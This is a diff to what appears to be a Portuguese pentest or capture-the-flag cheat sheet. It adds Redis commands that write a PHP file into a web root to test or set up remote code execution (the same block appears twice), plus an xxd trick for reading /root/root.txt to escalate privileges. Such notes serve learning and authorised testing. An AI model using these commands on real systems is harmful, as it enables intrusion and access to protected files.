@@ -174,4 +174,25 @@ export PATH=/tmp:$PATH #trocar o path de um executavel caso seja possivel para e
 
 enum4linux -A <ip> # enumerar serviços smb rodando em um possivel alvo
 
+config set dir /var/www/html
+config set dbfilename redis.php
+set test "<?php phpinfo(); ?>"
+save                                     # testar RCE em servidor com redis mal configurado
+
+config set dir /var/www/html
+config set dbfilename redis.php
+set test "<?php phpinfo(); ?>"
+save                                     # configurar RCE em servidor com redis mal configurado
+
+LFILE=/root/root.txt
+echo $LFILE
+usr/bin/xxd "$LFILE" | xxd -r   #exploração de xxd para elevação de privilégios
+
+
+
+
+
+
+
+
 
